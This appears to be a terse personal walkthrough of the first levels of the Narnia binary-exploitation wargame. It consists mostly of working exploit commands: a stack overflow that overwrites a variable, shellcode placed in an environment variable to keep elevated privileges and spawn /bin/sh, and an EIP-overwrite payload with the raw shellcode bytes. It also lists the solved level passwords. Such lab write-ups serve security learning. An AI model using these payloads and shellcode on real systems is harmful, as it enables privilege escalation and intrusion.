# level 1:
(echo -e "aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde"; cd "/etc/narnia_pass/"; cat;) | ./narnia0
                                ^ cause stack overflow to write to val     ^ /bin/sh runs cat with no eof
WDcYUTG5ul

# level 2:
create env var with a shellcode to set euid to uid
shellcode: "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"
echo -ne "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81" > shellcode.bin
export EGG=$(cat shellcode.bin)
./narnia1
https://shell-storm.org/shellcode/files/shellcode-607.html
5agRAXeBdG

level 3:
understand assembly
http://unixwiz.net/techtips/win32-callconv-asm.html
gdb narnia2
set disassembly-flavor intel
diassemble to see the code
the argument passed (when exceeding limit) will override values in the stack
we aim to override eip to point to the function we want to run
The payload we pass is the following
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81ccc\xe0\xd1\xff\xffbbbb
^ padding to exceed 128 characters                                      ^ shellcode to run /bin/sh                                                                                                                                                                                       padding to align eip ^ ^ malicious eip to point to shellcode
$(echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81ccc\xe0\xd1\xff\xffbbbb")

2xszzNl6uG